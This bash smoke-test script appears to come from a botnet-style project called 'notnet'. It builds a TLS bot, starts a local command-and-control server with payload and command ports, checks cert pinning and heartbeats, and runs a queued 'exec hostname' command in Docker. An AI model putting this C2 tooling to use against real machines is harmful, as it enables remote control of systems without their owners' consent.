#!/usr/bin/env bash
# c2-server TLS smoke — real bot (TLS=1 build) against the real C2 over
# HTTPS with a pinned cert. Verifies:
#   [1/6] make TLS=1 builds clean (zero warnings)
#   [2/6] TLS handshake + cert-pin verification on the bot
#   [3/6] heartbeats flow over TLS and the bot shows in inventory
#   [4/6] a command is delivered + executed over TLS
#   [5/6] wrong pin fails closed (mismatch, no connection, spread gate opens)
#   [6/6] cleanup
# Exit code 0 only when every check passes. Needs docker + openssl.

set -u
cd "$(dirname "$0")/.."                     # repo root
REPO="$(pwd)"
WORK=$(mktemp -d /tmp/notnet-tls-smoke.XXXXXX)
API=18096
TLS_PORT=18454
PAYLOAD_PORT=18455
C2_PID=""
fail=0

cleanup() {
    [ -n "$C2_PID" ] && kill "$C2_PID" 2>/dev/null
    docker rm -f tls-smoke-bot tls-smoke-badbot >/dev/null 2>&1
    rm -rf "$WORK"
}
trap cleanup EXIT

pass() { echo "PASS: $1"; }
bad()  { echo "FAIL: $1"; fail=1; }

echo "=== TLS smoke (real binary, TLS=1, pinned cert) ==="

# [1/6] TLS build in a bookworm builder (matches the bot container's glibc)
echo "[1/6] Building TLS=1 binary (bookworm)"
if ! docker run --rm -v "$REPO:/src" -v "$WORK:/out" -w /src debian:bookworm-slim \
     bash -c 'apt-get update -qq >/dev/null 2>&1 && apt-get install -y -qq --no-install-recommends gcc libc-dev make libssl-dev >/dev/null 2>&1 \
              && make clean >/dev/null 2>&1 && make TLS=1 > /out/build.log 2>&1; \
              grep -cE "warning|error" /out/build.log > /out/warncount; \
              cp notnet /out/notnet-tls; test -s /out/notnet-tls'; then
    bad "TLS build failed in container"
    exit 1
fi
if [ "$(cat "$WORK/warncount")" != "0" ]; then
    bad "make TLS=1 produced warnings ($(cat "$WORK/warncount"))"
    exit 1
fi
pass "make TLS=1 builds clean (zero warnings)"

# TLS bot image
echo "[2/6] Building TLS bot image"
cp "$WORK/notnet-tls" "$WORK/notnet"
if ! docker build -q -f tests/sim/Dockerfile.tlsbot -t notnet-tls-smoke-bot "$WORK" >/dev/null; then
    bad "TLS bot image build failed"
    exit 1
fi
pass "TLS bot image built"

# Cert + pin
openssl req -x509 -newkey rsa:2048 -keyout "$WORK/key.pem" -out "$WORK/cert.pem" \
    -days 1 -nodes -subj "/CN=notnet-c2" 2>/dev/null
PIN=$(openssl x509 -in "$WORK/cert.pem" -outform DER | sha256sum | cut -d' ' -f1)

# C2 with TLS listener
mkdir -p "$WORK/queue" "$WORK/payload"
cp "$WORK/notnet-tls" "$WORK/payload/notnet"
NOTNET_C2_TLS_CERT="$WORK/cert.pem" NOTNET_C2_TLS_KEY="$WORK/key.pem" \
  python3 c2-server/c2.py --secret smokesecret --http-port "$TLS_PORT" \
  --payload-port "$PAYLOAD_PORT" --console-port "$API" --ws-port 18082 --irc-port 16668 \
  --queue-dir "$WORK/queue" --payload-dir "$WORK/payload" --db "$WORK/c2.db" \
  >"$WORK/c2.log" 2>&1 &
C2_PID=$!
sleep 1

# Good-pin bot config
cat > "$WORK/good.conf" <<EOF
http_server=127.0.0.1
http_port=$TLS_PORT
http_path=/api/v1/bot
tls_cert_pin_sha256=$PIN
ws_enabled=0
irc_enabled=0
c2_secret=smokesecret
heartbeat_interval=2
scan_interval=1
persist_enabled=0
bot_tag=smoke-tls-1
EOF

# [3/6] bot connects over TLS + heartbeats
echo "[3/6] TLS handshake + heartbeats over TLS"
docker run --rm -d --name tls-smoke-bot --network host \
  -v "$WORK/good.conf:/etc/notnet.conf:ro" notnet-tls-smoke-bot >/dev/null
handshake=""
for i in $(seq 1 25); do
    handshake=$(docker logs tls-smoke-bot 2>&1 | grep -E "TLS: certificate fingerprint verified" | head -1)
    [ -n "$handshake" ] && break
    sleep 1
done
if [ -z "$handshake" ]; then bad "bot did not verify the cert pin"; exit 1; fi
pass "TLS handshake + cert-pin verified"
for i in $(seq 1 25); do
    grep -q "tag=smoke-tls-1" "$WORK/c2.log" && break
    sleep 1
done
if ! grep -q "tag=smoke-tls-1" "$WORK/c2.log"; then bad "no TLS heartbeats reached the C2"; exit 1; fi
pass "heartbeats flow over TLS (bot in inventory)"

# [4/6] command over TLS
echo "[4/6] command delivered + executed over TLS"
./c2-server/c2ctl --api "http://127.0.0.1:$API" queue --target smoke-tls-1 exec hostname >/dev/null
executed=""
for i in $(seq 1 25); do
    executed=$(docker logs tls-smoke-bot 2>&1 | grep "CMD: exec: allowlist hit: hostname" | head -1)
    [ -n "$executed" ] && break
    sleep 1
done
if [ -z "$executed" ]; then bad "exec over TLS not executed"; exit 1; fi
pass "command delivered + executed over TLS"

# [5/6] wrong pin fails closed
echo "[5/6] wrong pin fails closed"
docker rm -f tls-smoke-bot >/dev/null 2>&1
sed 's/^tls_cert_pin_sha256=.*/tls_cert_pin_sha256=0000000000000000000000000000000000000000000000000000000000000000/; s/^bot_tag=.*/bot_tag=smoke-tls-bad/' \
  "$WORK/good.conf" > "$WORK/bad.conf"
docker run --rm -d --name tls-smoke-badbot --network host \
  -v "$WORK/bad.conf:/etc/notnet.conf:ro" notnet-tls-smoke-bot >/dev/null
mismatch=""
for i in $(seq 1 15); do
    mismatch=$(docker logs tls-smoke-badbot 2>&1 | grep "TLS: cert fingerprint mismatch" | head -1)
    [ -n "$mismatch" ] && break
    sleep 1
done
if [ -z "$mismatch" ]; then bad "bad pin was not rejected"; exit 1; fi
pass "wrong pin rejected (fail-closed)"

# [6/6]
echo "[6/6] cleanup"
docker rm -f tls-smoke-badbot >/dev/null 2>&1

if [ "$fail" -eq 0 ]; then
    echo "TLS SMOKE: PASS"
    exit 0
else
    echo "TLS SMOKE: FAIL"
    exit 1
fi
